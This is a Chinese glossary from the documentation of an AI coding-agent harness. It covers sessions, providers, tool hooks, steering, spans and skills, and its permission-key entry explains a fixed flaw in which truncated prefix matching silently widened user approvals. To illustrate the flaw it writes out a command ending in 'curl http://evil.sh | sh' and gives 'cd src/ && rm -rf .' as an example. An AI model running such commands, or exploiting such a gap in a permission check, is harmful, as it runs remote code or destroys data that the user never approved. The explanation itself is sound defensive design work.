参见：[edit（精准编辑工具）](#edit精准编辑工具)、[decodeChildOutput](#decodechildoutput子进程输出解码)、[DECISION_LOG](./DECISION_LOG.md) 同日“grep 三选一”那条

### grill-me（逼问式讨论技能）
`skills/grill-me.md`。**逼问式讨论**技能，接的是 [ask](#ask分叉点提问工具) 的"保留选项·先讨论"这一路：模型**一次只问一个问题**、**每题附上自己的推荐答案**、能自己查代码得到答案的就**不要问**——把"讨论"约束成有推进力的追问，而不是把一堆问题一次性倒给用户。聊完**重抛**分叉点让用户拍板。

原版来自 Matt Pocock（技能名 `grill-me`，本仓按其原意落地），文件里另补了一段中文接线说明：三问（**目前遭遇的问题是什么** / **需要思考的矛盾点是什么** / **抉择的对象是什么**）与四条落地要求（一次一问 · 附推荐答案 · 自己能查就别问 · 聊完重抛）。

参见：[ask](#ask分叉点提问工具)、[Skill](#skill技能)、`Log/ROADMAP.md` 的 10.12.15

## H

### Harness
启动编排类（`export class Harness`），位于 `src/harness/index.ts`。`run()` 执行 `check()` → `main(result)` 的完整启动流程。Harness 不持有循环，只做编排。

它**自持一个事件发射器**（`events = new PromptEventEmitter()`）发 harness 层事件（`check_start` / `check_done`），并对外暴露 `subscribe()`——启动进度因此也能被订阅，不必等 Runtime 建好。

参见：[Runtime](#runtime)、[Check](#check)、[Diagnostic](#diagnostic诊断条目)

### Hook（钩子扩展）
这个词在项目里有**两个意思**，混了就会误读：

1. **装载口子意义的 hook**：住在 `src/extensions/hooks/`、export `registerHooks` 的扩展文件。目录名是按“怎么装进来”命名的。
2. **总线 API 意义的 hook**：`events.on(type, handler)`——精确监听，返回值经 `emitHook` 收回，因此**能改写流程**。

全项目有四个发射点：`context/system-prompt.ts` 里的 `before_build` 与 `before_request`（提示词层），
`loop/agent-loop.ts` 里的 `before_tool_call` 与 `after_tool_call`（工具生命周期，2026-09-12 起）。
工具钩子的语义：**可拦截、不可改参**——`before_tool_call` 返回 `{action:'deny', reason}` 即拦截
（工具不跑，模型收到理由），返回 undefined 放行；没有静默换参的能力（语义决策见
DECISION_LOG 锚点 log-2026-09-12-tool-hooks）。容错是 **fail-open**：钩子异常 / 返回形状不对
一律放行（钩子是基础设施不是策略），只记 stderr。`after_tool_call` 只读观察，收到
`{name, args, result, ok, durationMs}`，返回值不消费。发射点唯一性由 `verify-hooks.ts` S1/S2 守护。

**住在 `hooks/` 目录 ≠ 用了 `on`**。`trace-log` 就曾住在这个目录却只用 `subscribe`，因此被误读为“trace 与钩子机制有关”，现已搬到 `watchers/`。

对比：[Watcher](#watcher旁观扩展)

### 会话仓库层（SessionRepo / jsonl-repo）

**目录级的会话管理**，与"单会话存储"分家——`SessionStorage` 只管一个会话文件**内部**的读写
（entry 树 / leaf / compaction），`SessionRepo`（契约在 `src/core/session-repo.ts`，实现在
`src/session/jsonl-repo.ts`）管 `sessions/` 目录下**一群**会话文件：`list`（列表，按修改时间倒序、
坏文件跳过）/ `open` / `create` / `remove`。对标 Pi 的 jsonl-repo.ts。

删除是它带来的**第一个破坏性会话操作**，守卫两层：repo 层 `isRemovableSessionName` 白名单
（拒路径分隔符与 `..`，堵穿越）+ Runtime 层拒删**当前活跃会话**（否则 `this.session` 指向已
unlink 的文件、后续 append 静默丢消息）；UI 的 disabled 只是提示层。
`RuntimeOptions.sessionRepo` 可选注入，缺省回退旧静态路径。四个管理方法都由 Runtime 委托
repo，`verify-repo.ts` 用探针 repo 钉住这条委托线。

参见：[JsonlSessionStorage](#jsonlsessionstorage)、[SessionStorage](#sessionstorage)

## I

### InMemorySession
`SessionStorage` 接口的内存实现，位于 **`src/session/in-memory.ts`**（旧文档写的 `src/runtime/session.ts` 不存在）。数据存在内存数组里，进程重启即丢。

**它不是默认实现**——实际装配走 [JsonlSessionStorage](#jsonlsessionstorage)（落 `sessions/*.jsonl`）。

参见：[SessionStorage](#sessionstorage)

## J

### JsonlSessionStorage
**默认的会话存储实现**，位于 `src/session/jsonl-storage.ts`。它的文件头注释把模型说得很清楚：

- 每条消息是**树里的一个 entry**（`id` + `parentId`），**文件顺序 ≠ 对话顺序**
- **leaf 指针**标记“当前在哪条线上”：持久化靠 leaf entry，内存靠 `currentLeafId`
- `fork` 复制根 → leaf 前缀到新文件，**原文件不动**（审计性）

一行一条落 `sessions/*.jsonl`，形如 `{"type":"message","id":"m2","parentId":"m1","role":"assistant","content":"...","timestamp":2}`。`/history` 读 `getAllStored()` 展示当前分支，`/sessions` 读 `getDir()` 列会话，`/fork` 走 `forkTo()`。

**压缩摘要就在同一个文件里**：`JsonlSessionStorage` 自己 `implements CompactionStore`，`appendCompaction(summary, firstKeptId)` 往树里追加一条 `{"type":"compaction","id":...,"parentId":...,"summary":...,"firstKeptId":...}` entry，`getMessages()` 遇到它就转成 `[对话摘要] …` 的 system 消息。

**不存在独立的 `sessions/*_summary.jsonl`**——那是 v1 机制，全 `src/` 无一行代码写它（旧词条此处写错，已于 2026-09-04 改正）。现存的 `sessions/archive-v1/default_summary.jsonl` 只是归档遗物，而 `isSessionFileName()` 还专门把含 `_summary` 的文件**排除**在 `/sessions` 列表外。

`message` entry 除 `role` / `content` 外还有三个可选结构化字段（`tool_calls` / `tool_call_id` / `name`），格式上支持 function calling 往返——但**当前既无人写入也无人消费**，见 [ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 9 条。

参见：[SessionStorage](#sessionstorage)、[InMemorySession](#inmemorysession)、[Compaction](#compaction上下文压缩)

## L

### LLMConfig
LLM Provider 配置类型（`llm/types.ts`），读取自 **`config/active-config.json`**：`provider?`（厂商标识）、`baseUrl`、`apiKey`、`model`、`thinking?`（`'auto' | 'on' | 'off'`）。

（旧文档写的 `config/api.json` 不存在，字段也不止三个。）

参见：[Config（配置）](#config配置)

### LLMMessage
一条对话消息（`llm/types.ts`）：`role` 有**四种**（`system` / `user` / `assistant` / **`tool`**）、`content` 文本，另有可选的 `tool_calls?`（仅 assistant）、`thinkingBlocks?`（仅 assistant、仅 Anthropic 路径）、`name?` 与 `tool_call_id?`（仅 tool）。

`thinkingBlocks` 的作用域是**单次 `run()` 内的内存消息链**——`MessageEntry` 没有这个字段，块永不落盘，所以跨轮次没有回放义务。

别把理由记成“会话存储只存纯文本”（旧版本条与 `llm/types.ts` 注释都这么写，2026-09-04 查出是错的）：`tool_calls` / `tool_call_id` / `name` 是**能**落盘并还原的，只是 `runtime.ts` 组装请求时又把它们丢了，而那道丢弃是承重的——见 [ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 9 条。

### LLMProvider
LLM 调用抽象接口，位于 `src/llm/types.ts`。两个方法：`chat(messages, tools?, opts?)` 返回 `Promise<ChatResult>`（非流式，含结构化工具调用）、`stream(messages, tools?, opts?)` 返回 `EventStream<LLMStreamEvent>`（流式）。

**实现只有两个**：`DeepSeekProvider`（OpenAI 兼容）与 `AnthropicProvider`。注释里提到的 Ollama / 自定义协议尚未实现。

注意别和 [Provider（供应商）](#provider供应商) 混了——那是供应商元数据，不是调用抽象。

参见：[DeepSeek Provider](#deepseek-provider)、[EventStream](#eventstream推拉通道)

## M

### Mode（运行模式）
`enum Mode { Repl = 'repl', Rpc = 'rpc' }`（`types.ts`），用于切换交互模式。缺省 `Repl`。

**两种都已落地**：`harness/repl.ts` 的 `runReplMode()` 与 `harness/rpc.ts` 的 `runRpcMode()`，由 `harness/main.ts` 按 mode 分派。（旧文档写“未来支持 Rpc”已过期。）

### MockSession
`SessionStorage` 的测试替身，位于 **`src/session/mock.ts`**（旧文档写的 `src/runtime/session.mock.ts` 不存在）。`messages` 字段公开，测试中可直接断言内容。

参见：[SessionStorage](#sessionstorage)

## O

### OnToken Callback
`prompt(input, onToken?, streamingBehavior?)` 的第二个可选参数，每收到一个流式 chunk 时调用一次。

**当前三个调用点全都不传它**：`repl.ts` 与 `rpc.ts` 只传 input，`tree-ui.ts` 甚至显式写 `undefined` 跳过它去传第三个参数。UI 联动实际走 [EventBus](#eventbus事件总线) 订阅。Runtime 内部仍会在个别分支调它（如插入 steer 消息时回一句提示），所以它没死，只是**没人从外面接**。（旧文档写它是“当前 UI 联动方式”已过期。）

对比：[Event Subscription](#event-subscription事件订阅)

## P

### permissionDetail（权限弹窗文案）
`core/tools.ts` 里 `ToolDefinition` 与 `ToolProvider` 的**可选成员**（签名 `(args) => string`），工具用它自定义权限确认弹窗里显示什么。不提供（或返回空串）时 `agent-loop.ts` 退回默认的 `JSON.stringify(args).slice(0, 80)`。

为什么需要它：那 80 字符对 `write` 勉强够用（能看到 path），但 [edit](#edit精准编辑工具) 的参数里有 `oldText` / `newText` 两段文本，前 80 字符连路径都显示不全——用户在弹窗里看不出要改什么，却要在这时候决定放不放行。

两条硬约束（违反会坏 UI）：

- **必须返回单行**：`selector.ts` 的标题只占 1 行（另加 1 行分隔线）、每行过 `fitWidth` 截断（**截断不折行**）。文案里带 `\n` 会多出一个物理行，把“固定行数 + 回退清行”算错 → 选择器漂移
- **不要在这里做文件 I/O**：它在渲染路径上被同步调用

它**只管显示**。授权匹配用的是另一个键（`agent-loop.ts` 里的 `autoKey`，见 [permissionKey](#permissionkey授权匹配键)）——若把富文本 detail 当匹配键，“本次全部允许”会永远匹配不上，因为每次文案都不一样。改前匹配、记录（`grantAutoAllow`）与显示这三个职责由同一个 `detail` 变量兼着（一变量三职），2026-09-04 拆成两个变量；同日晚些时候**匹配键本身也换了**（不再是 args 的 JSON 前 80 字符，而是工具定义的授权边界且不截断）——授权只存在内存的 `Set` 里、从不落盘，所以换格式没有迁移问题。

刻意做成**可选**成员（与 `EventBus.emitHook?` 同一手法）：全库有 9 处替身 implements `ToolProvider`（2026-09-06 逐处数过；本句早先写的 7 处已失真），加必需成员会全部打坏——但这半句在本仓库**无法用 tsc 验证**（`scripts/` 不进类型检查，实测把 `ToolDefinition.parse` 改成必需 `tsc --noEmit` 仍 0 错），只能逐处数，见 [TESTING.md](./TESTING.md)。

参见：[edit](#edit精准编辑工具)、[EventBus](#eventbus事件总线)、[permissionKey](#permissionkey授权匹配键)

### permissionKey（授权匹配键）
`core/tools.ts` 里 `ToolDefinition` 与 `ToolProvider` 的**可选成员**（签名 `(args) => string`），工具用它定义“这次授权的边界是什么”。不提供（或返回空串）时 `agent-loop.ts` 退回**完整的** `JSON.stringify(args)`——注意**不截断**（截断正是它要替掉的那个洞）。

三个需确认的工具各给一个键（`ls` / `read` / `grep` 不需确认，也就用不着键）：

| 工具 | 键 | 刻意不含 |
|------|----|---------|
| `write` | 归一化后的 `path`（反斜杠→正斜杠） | `content` |
| `edit` | 归一化后的 `path` | `oldText` / `newText` / `replaceAll` |
| `bash` | **完整** `command`（一字不截） | `description` |

为什么要有它：默认的 args JSON 原先被截到 80 字符，而 `PermissionManager` 用 `startsWith` 做前缀匹配——**截断 + 前缀 = 静默扩权**。实测批准过 `node node_modules/typescript/bin/tsc --noEmit && node scripts/run-verify.mjs`（76 字符）之后，同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）也会被自动放行，因为两个键在 80 字符处截成了逐字符相同的字符串。用户点的是“允许这一条”，给出的却是“允许前 80 字符相同的所有调用”。

配套的两处改动（2026-09-04）：`agent-loop.ts` 的兜底键不再 `.slice(0, 80)`；`PermissionManager` 从 `some(startsWith)` 换成 `Set.has()` **精确匹配**（`core/permission.ts` 的参数名也从 `detail` 改成 `authKey`，因为 detail 在本项目专指弹窗文案）。于是授权范围就等于**用户点“本次全部允许”时那一次调用的边界**。

两条要记住的后果：

- **一处刻意的放宽**：键不含内容，所以“本次全部允许” = 本会话内不再问这个文件（哪怕下次改的是完全不同的片段）。取舍见 [DECISION_LOG.md](./DECISION_LOG.md)
- **目录级授权明确不支持**：授权 `write:src/` 不会放行 `write:src/data.txt`。前缀匹配要求键本身是路径语义才安全，而 `bash` 的键是完整命令、`cd src/` 就以 `/` 结尾——按“以 / 结尾就前缀放行”等于批准 `cd src/ && rm -rf .`

授权的**生命周期**是本次会话：`runtime.clearSession()`（`/clear` 与 RPC 的 clear 都走它）会连带调 `PermissionProvider.clear()`。在此之前 `clear()` 是项目第三处“支持但未接线”，那个“本次”实际是“本进程”（一直有效到退出）。

断言见 `scripts/verify-permission.ts`（62 项）。参见：[permissionDetail](#permissiondetail权限弹窗文案)（显示归显示、匹配归匹配）、[edit](#edit精准编辑工具)、[ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 10 条

### Pi 模式
Agent 不持有循环，调用方持有 `while(true)` 负责驱动。**本项目采用这种模式**：循环体在 `harness/repl.ts` 的 `runReplMode()`（不是旧文档写的 `main.ts`，main.ts 只是调用方），Runtime 只被反复调 `prompt()`。

Runtime 对外当然不止 `prompt()` 一个方法（见 [Runtime](#runtime)），这里说的只是“它不管循环”。

对比：[CLI 模式](#cli-模式)

### PROJECT.md（现状快照）
cwd 下 `.flint/` 里的[生命周期三件套](#chartermd目标契约文档)之一。内容是"**当前系统由哪些模块 / 技术点构成**"——让模型一进场就知道自己正在改的是个什么东西，不必靠 `ls` 现猜。

**性质是快照**：描述的是**当下**，随代码漂移，**自由改、不需许可**（与 `CHARTER.md` 的"改需许可"相对）。**每轮由 `runtime` 直读文件、注入 system prompt 的 `project` 层**——**刻意不建 store**：它是**只读注入**，文件本身就是真相源，运行期直读即自愈，避免出现第二个"判定源"（也就不必回答 C 方案那条"谁负责通知 UI"——**没搬进内存，就不用补通知线**）。文件不存在 / 空 / 读失败一律**不注入**（不塞一句"[项目现状]（空）"占预算）；超 3000 字截断带标记。

参见：[CHARTER.md（目标契约文档）](#chartermd目标契约文档) · [DEVLOG.md（开发日志）](#devlogmd开发日志)

### Project Metadata（项目元数据）
不产生功能但定义项目如何被理解的所有文件。分为四类：Rule、Document、Config、Skill。

参见：[[项目元数据（Project Metadata）]]

### PromptEvent
事件系统的事件类型（**早已落地**，不再是“计划中”）。契约在 `core/events.ts`，实现在 `runtime/events.ts`，十余种类型 + 四组骨架 span。

详见 [EventBus](#eventbus事件总线)、[Span](#span行为段)。本条只保留词条名，免得旧链接断掉。

### Provider（供应商）
**别和 [LLMProvider](#llmprovider) 混了**，两个完全不同的东西，名字像而已：

- `LLMProvider`（`llm/types.ts`）= **调用抽象**：`chat()` / `stream()`
- `Provider`（`llm/provider.ts`）= **供应商元数据**：显示名、模型列表、`getApiKey` / `fetchModels` 行为引用。由 `createProviderFromConfig()` 造、`ProviderRegistry` 持有（`ConfigManager` 用它，`/model` 列模型时读它）

设计要点写在 provider.ts 的注释里：数据在外部配置、对象只持行为引用。模型列表是**后台预热 + 按需现拉**，不在启动关键路径上。

参见：[LLMProvider](#llmprovider)

## R

### REPL 模式
`Read → Eval → Print → Loop` 的交互循环。用户打字 → Agent 回复 → 等下一次输入。

循环体在 **`harness/repl.ts` 的 `runReplMode()`** 里（`harness/main.ts` 只是调用方——旧文档写“在 main.ts 的 runReplMode()”把定义和调用混了）。对应的 RPC 模式在 `harness/rpc.ts`。

参见：[Mode（运行模式）](#mode运行模式)、[Pi 模式](#pi-模式)

### Rule（规则）
约束 AI 或开发者行为的文件。属于[项目元数据](#project-metadata项目元数据)的一类。

本项目是 `CLAUDE.md`（项目根，给 AI 的总则）+ `Log/*_RULES.md` 五份规则书（分别约定变更日志、架构演进日志、决策日志、ROADMAP、目录文档怎么写）。（旧文档举的 `CLAUDE.init.md` 不存在。）

### Runtime
运行时上下文类（`export class Runtime`），位于 `src/runtime/runtime.ts`。**持有 11 个必注入子系统**（见 [RuntimeOptions](#runtimeoptions)），不只是 LLMProvider。

对外主要方法：`prompt()`（返回 `Promise<string>`）、`subscribe()` / `on()`（事件）、`registerCommand()` / `listCommands()`、`select()` / `selectMulti()` / `readLineInput()`（交互钩子，TTY 由 TreeUI 注册实现，管道模式退回默认）、`onInput()`、`clearSession()`、`getHistoryMessages()`、`getTraces()` / `getRunningSpans()`（观测只读委派）。

它**没有** `start()` / `stop()`——不持有循环（见 [Pi 模式](#pi-模式)）。

### RuntimeOptions
Runtime 构造选项（`types.ts`）。**11 个必注入**（无默认值，`main.ts` 显式组装）：`llm`、`session`、`tools`、`permission`、`skills`、`events`、`spanCollector`、`commandSystem`、`diagnosticsService`、`compaction`、`systemPromptService`。

可选：`mode`、`model` / `provider` / `baseUrl`（供 `/model` 查看切换）、`thinking`（阶段 C2 三态）、`services`（仍是 `unknown`，标着 TODO）。

（旧文档只列了 `mode`/`llm`/`session`/`services` 四项，漏掉九个必注入子系统。）

## S

### 分段编号（Segmented ID）
路线图坐标编号的形状：**点分路径**（形如 `10` → `10.12` → `10.12.5`），**层次靠编号表达**而不是嵌套表——Markdown 表格嵌套不了，加缩进约定又会让解析从"一张表"退化成"一棵树"，而格式门禁的价值恰在"形状简单到能逐行校验"。`src/project/roadmap.ts` 的 `normalizeId` 把它收紧为 `/^\d+(?:\.\d+)*$/`（`1.` / `1.0` / `.1` / `1..2` / `a.1` / `-1` 全拒）；`parentOf` / `childrenOf` / `isAncestor` / `descendantsOf` 由编号推关系。**比较必须逐段按数值比**（`compareId`：`10.2 < 10.12 < 10.12.5`）——若按字典序会得出 `10.12.5 < 10.2` 这种错序，而依赖列表要靠它升序去重才稳定。**父级状态由子树派生、不是写上去的字段**：全部搁置 → 搁置、全已完成/搁置 → 已完成、全未开始 → 未开始、否则进行中；显式搁置覆盖派生。父编号**必须先存在**，否则报"层次无从解析"。

参见：`Log/ROADMAP.md` 的 10.12.14（编号规律 `10.<组>.<序>` 一直如此，本仓第一次把它**当层次用**）

### SessionStorage
会话存储接口。**唯一真身在 `core/storage.ts`**：三个必需方法（`appendMessage(role, content, extra?)`、`getMessages()`、`clear()`）+ 三个**可选成员**（`getAllStored?` / `forkTo?` / `getDir?`，即 entry 树能力）。三个实现：[JsonlSessionStorage](#jsonlsessionstorage)（**默认**，落盘，三个可选成员全有）、[InMemorySession](#inmemorysession)、[MockSession](#mocksession)（测试替身，后两个都没有可选成员）。

`types.ts` 里也 export 这个名字，但那只是**转发**（`export type { SessionStorage, StoredMessage } from './core/storage.js'`），不是第二个接口；`RuntimeOptions.session` 直指 core 版，所以调用方能直接拿到可选成员。

**可选成员靠能力探测缩窄，不靠 `instanceof`**：`runtime.ts` 写的是 `if (this.session?.getAllStored)` 这类判断——实现了该成员就是 entry 树存储，没实现就走 `getMessages()` 兜底。（2026-09-03 之前这里写的是 `instanceof JsonlSessionStorage`，且 `types.ts` 另有一个只含三必需方法的同名接口，两处注释互相矛盾；已收敛，过程见 [ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 1 条。）

走接口调用时注意：`StoredMessage` 的 `id` 与 `msgId` **都是可选的**（兼容 JSONL 用 `id`、对外 API 用 `msgId`），而 `JsonlSessionStorage` 自己的签名比接口窄（`msgId` 必填）。所以 runtime 里显式做了兜底：`m.msgId ?? m.id ?? ''`。

### SSE（Server-Sent Events）
HTTP 流式传输协议，服务端持续发送 `data: {...}\n` 格式的事件。DeepSeek 和 OpenAI 的流式 API 都基于 SSE。

### Skill（技能）
Agent 可调用的能力模块，**已落地**（旧文档标“计划中”已过期）：

- `runtime/skill.ts`：`SkillLoader extends Loader<LoadSkillsResult>`，配 `Skill` / `SkillFrontmatter` 类型（读 markdown 的 frontmatter 取元信息）
- `context/sections/skills-section.ts`：把可用技能写进 system prompt
- 技能文件放项目根 `skills/`（现有 `review.md`）

`SkillLoader` 是 Runtime 的必注入子系统之一（`RuntimeOptions.skills`）。

不属于[项目元数据](#project-metadata项目元数据)——Skill 是可执行的，元数据是声明式的。

### 技能热重载（Skill hot reload）
`SkillLoader` 的 `startWatch`/`stopWatch`/`reload`/`onChange` 四件套（2026-09-12）：零依赖 `fs.watch` 盯 `skills/` 目录，事件防抖 300ms 合并，`reload` 算增删差（added/removed）后通知观察者；watcher error（目录被删）静默退场、内存清单保持旧值。

### 技能依赖追踪（depends / getDependents / broken）
技能的**声明式依赖**（2026-09-12）：frontmatter 写 `depends: a, b`（逗号分隔、去重保序），加载进 `Skill.depends`；`getDependents(name)` 反查"谁声明了依赖 X"（悬空名字也可查）。两个消费出口：系统提示词技能段标注「依赖 / 缺失」（静态悬空声明的暴露口，每轮自愈）；热重载 `SkillChange.broken` 列出因本次删除而失去依赖的技能（TreeUI 提示「⚠ x 失去依赖」）。**没有 `addDependency`**——无调用方的公开方法是「支持但未接线」债，见 [DECISION_LOG](./DECISION_LOG.md#log-2026-09-12-skill-deps)。

**"谁通知 UI"的答案**：不需要通知——提示词层每轮 `systemPromptService.build` 现取 `getAll()`，内存清单一刷新 LLM 侧自动生效；`onChange` 观察者只服务 UI 提示（TreeUI 诊断区追加「🔄 技能已热更新」行）。启动期 `load()` 不通知，通知只在热重载路径。参见 [TaskStore](#taskstore任务清单真相源)（同一观察者范式）与 [Compaction](#compaction上下文压缩)（同日修掉的绑死 bug）。

### spec（工具参数规格）
`tools/spec.ts`（2026-09-06 新增，5 个构造器 + 2 个派生函数 + [defineTool](#definetool工具定义构造器)）。**一份定义派生三样**：`toJsonSchema(spec)` → 发给 LLM 的 `parameters`；`parseSpec(spec, args)` → 运行时审核并补齐默认值；`Infer<typeof spec>` → handler 的入参类型。改一处、三处同时变——`verify-spec.ts` 的 1-6~1-8b 用**对照组**钉住这一点（只改 spec 里一个键，两个派生物必须同时跟着变），否则“同源”可以被实现成“两份各自硬编码但恰好一致”而全绿。

五种形状覆盖项目现有 16 个字段：`str` / `strAllowEmpty`（必填但允许空串，`edit` 的 `newText` 空串 = 删掉这一段）/ `optStr` / `optPosInt` / `optBool`。**刻意不做**跨字段约束、嵌套对象、union、自定义 refine——多写一分就是多一处要维护的死代码。这也是不引 Zod / TypeBox 的理由：表达力用不到十分之一，而 Zod 还要 `zodToJsonSchema` 这座**有损**的桥（`.refine()` 之类会被静默丢掉）。取舍见 [DECISION_LOG.md](./DECISION_LOG.md)。

它治的三个病（改前实测取证，不是推导）：

| 病 | 改前 | 现在 |
|----|------|------|
| 那份 Schema 是“建议书”不是契约 | `registry.execute()` 只有 3 行，`tool.parameters` **一个字段都没读**：造一个 `required: ['mustHave']` 的工具，①什么都不传 ②传一个对象 ③传 Schema 里根本不存在的参数名——三次全部返回 `[OK]` | `execute` 先跑 `parse`，缺参 / 多余参数 / 类型不对一律 `[INVALID]` |
| `String(val)` 是**永远通过的校验** | 传 `123` / `{a:1}` / `['src']` / `true` 全部通过，被强转成 `"123"` / `"[object Object]"` / `"src"` / `"true"`，直到**文件系统层**才失败并报 `[NOT_FOUND]` / `[NOT_FILE]`——归因错到另一层，模型会以为是自己路径写错而开始猜路径 | 四个盲区全堵（`coerce` 是全项目**唯一**做参数类型判断的地方） |
| 多余参数静默忽略 | `{pattern:'x', pathh:'typo'}` 让 `path` 退回默认 `'.'`，搜完整个项目还报 `[OK]` | 拒，且文案里**列出可用参数名**——`'patern'` 那类拼写错误唯一能被当场纠正的机会 |

一处宽容是刻意的：数字字段接受数字字符串（`'3'`）、布尔字段接受 `'true'` / `'false'`（模型常这么传，拒了只是白烧一轮），但数字 `1` 当布尔传会被拒——改前 `String(args.replaceAll) === 'true'` 会把 `1` 静默当成 `false`，模型以为自己开了全量替换。

参见：[defineTool](#definetool工具定义构造器)、[ToolInputError](#toolinputerror参数不合法错误)、[grep（递归搜索工具）](#grep递归搜索工具)

### Span（行为段）
一次**有始有终**的行为，用“进门 / 出门”两个事件括起来。生产端拿到的是一个句柄：

- `span.set(…)`：往里塞字段。**不发事件**，只攒在闭包里
- `span.end(…)` / `span.fail(…)`：关门。此刻才把攒的字段一起并进出门事件

四组**骨架 span**（名字与字段受类型约束，写错段名或字段编译不过）：`prompt` / `llm_request` / `tool_call` / `compaction`。另有**便签通道** `note_start` / `note_end`，载荷是自由字典，扩展想加就加。

段是**嵌套的**：prompt 包着 llm_request，llm_request 又包着 tool_call。所以统计合计耗时**不能把各段 `durationMs` 相加**（会把同一段时间重复计好几遍），只能取最外层且彼此不重叠的 prompt 段。

参见：[SpanRecorder](#spanrecorder打卡机)、[CollectedSpan](#collectedspan)

### SpanCollector（段收集器）
**消费端**的配对件。契约在 `core/events.ts`（`feed` / `attach` / `recent` / `running` / `drainUnclosed`），实现在 `runtime/span-collector.ts` 的 `SpanCollectorImpl`，产出 [CollectedSpan](#collectedspan)。

配对规则：只认带 `spanId` 的事件（`tool_execution_start/end` 这类 UI 事件没有 `spanId`，不参与）· `_start` 进门登记 · `_end` 出门合并 · 孤儿 end **忽略而不猜** · 信封字段剥掉 · 便签段载荷走 `attrs`。

**总线自己不配对**，配对只在这里，全项目一份。两个消费者各持**独立实例**：`/traces` 命令（内存环形队列，缺省 200 条）与 `trace-log` watcher（`capacity:0`，成段即落盘）——不共享是为了消费者互不知情，且核心命令不能反过来依赖一个可选扩展。

对比：[SpanRecorder](#spanrecorder打卡机)（一个帮生产端打卡，一个帮消费端收段）

### SpanRecorder（打卡机）
**生产端**的打卡契约，在 `core/events.ts`。两个方法分工清楚：

- `trace(name, attrs, fn)`：回调式自动包裹，try/finally 结构保证关门
- `beginSpan(name, attrs)`：手动版。专给 prompt 段——它跨 `continue` 与 `finally`，套不进回调，只能在 finally 里判 `root.closed` 兼顾正常与异常两条出路

`spanRecorderOf(bus)` 做两件事：**类型收窄**（`EventBus` 接口里没有 `beginSpan`/`trace`，打卡能力在 `SpanRecorder` 这个另外的接口里，直接写 `events.trace(…)` 编译不过）与**能力探测退化**（测试替身只实现 `subscribe`/`on`/`emit` 时返回 `NOOP_SPAN_RECORDER`）。

NOOP **不是跳过这段代码，是跳过打卡**：回调照常执行，只换成空句柄。观测是旁路，不能反噬主流程。

对比：[SpanCollector](#spancollector段收集器)

### Steering（内层引导）
用户**在执行中途**插入的指示。落点决定它配不配叫这个名字：只有进**本轮**上下文才算引导，等整轮跑完再处理就只是 followUp 的高优先级版本（2026-09-10 之前本项目正是后者——名字许了一个没兑现的承诺）。

消费分两级（`Runtime` → `AgentLoop`）：① **内层**——`AgentLoop` 每次工具跑完、下一次 `llm.stream()` 之前调 `opts.takeSteer()` 取一条，**追加进最后一条 tool 结果的 content**（前缀 `[用户引导]`）→ 本轮内生效；同时被 `Runtime` 记入本轮缓冲，在**本轮 assistant 之前**落盘为独立 user 条目（内容带 `STEER_PREFIX`）→ 也进会话历史。② **外层兜底**——① 不适用时（本轮没有工具调用 = 没有注入落点；或已是最后一轮 = 取走会无人消费），消息留在 `steerQueue` 里，由 `prompt` 的外层循环当新一回合处理（本来就是独立回合，天然落盘）。**两级都不丢消息**，各有独立断言钉住。

**为什么注入是“追加”而不是新开一条 user 消息**：tool 结果在 `anthropic.ts` 里已转成 `user` 角色的 `tool_result` block，在**本轮请求内**再插一条 user 就是连续两条 user。与重复失败提示 / 收尾提示同一手法、同一条理由。

**落盘后真实出现的连续 user 怎么消化**：会话历史里会是 `user,user,assistant`（用户输入 + 引导 + 回复）。`toAnthropicMessages` 的 `user` 分支**能并则并**——上一条已是 user 就把文本块并进去，与它本来就在做的连续 tool 结果合并同层同手法；OpenAI 兼容路径原样透传，标准语义容忍。归并放适配器而非 runtime 历史映射处的取舍见 [DECISION_LOG.md](./DECISION_LOG.md)。（原前提“连续两条 user 必然 400”经核查**降级**：Anthropic API 参考称连续同角色轮会被服务端合并，与第三方 400 报告冲突且本机无法裁定，故修法与前提解耦。）

**刻意不做一件事**：不 abort 在飞的流——半截 `tool_call` 的 JSON 不可执行、已跑过的 `bash` 副作用无法撤销、部分输出的 assistant 消息留下就没有配对的 tool 结果（协议不合法），仍属【预留】。

参见：`scripts/verify-steering.ts`（48 项，含真 `Runtime` 端到端、抓真实请求体验线上序列，以及四组**变异测试**）· [ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第 11 条 · [ARCHITECTURE_LOG.md](./ARCHITECTURE_LOG.md) 2026-09-10 那块 · [DECISION_LOG.md](./DECISION_LOG.md) 同日那条

### Stable Anchor（稳定锚点）
**值不随标题文字变动**的锚点：把 `<a id="log-<日期>-<短名>"></a>` 单独一行写在标题**上方**，引用时写 `[说明](./ARCHITECTURE_LOG.md#log-…)`。

对比着看才清楚它解决什么：默认锚点是**标题 slug**，也就是 `f(标题文字)`——于是"链接不断"只能靠"标题文字不许改"，`verify-docs.mjs` 第 ④ 段那 6 条契约就是这么来的。代价有两条：**为了让机器能链接，人类散文被冻结**；而且引用粒度粗到只能写"同日 19:01 那块"这种模糊指代。显式 id 把这个依赖**倒过来**——id 由作者给定、与文字无关，标题日后怎么重述都不会断，引用也短、纯 ASCII。

**它与 append-only 是同一种不变性**：条目只追加不改写，所以 id 写一次就永不改。这层不变性此前**隐含在标题文字里、靠人守**，显式 id 只是把它变成写下来的。

**只从新条目开始带**：给 900+ 行旧日志补 id 性质上是"改写历史条目"，与 append-only 纪律冲突，所以 ④ 段那 6 条标题文字契约保留、不迁移——那个名单只会变短不会变长。

卫生由 `verify-docs.mjs` 第 ③ 段钉三条：同一份文件内**不重复**（重复会让跳转静默落到第一处）、命名守 `log-<日期>-<短名>` 形状、且**非空**（前两条在"一个都没扫到"时会空转全绿）。

参见：`ARCHITECTURE_LOG_RULES.md`（"新条目必须带 id"的约定）· [ARCHITECTURE_LOG.md](./ARCHITECTURE_LOG.md#log-2026-09-11-doc-number-check) · `scripts/verify-docs.mjs` 第 ③ 段

## T

### TaskStore（任务清单真相源）
任务清单的**唯一真相源**：`src/todo/store.ts` 里的内存结构化状态（`TaskItem[]` + 状态机）。运行期只让它说了算——[Runtime](#runtime) 注入 system 的 `task` 层时读它，轮数预算与 `thinking auto` 也读它。`TASK.md` 降级为它的**投影 + 启动种子**：写盘由 [todo](#todo任务清单工具) 工具在每次变更后做，读盘只在进程启动时做一次（`main.ts`）。

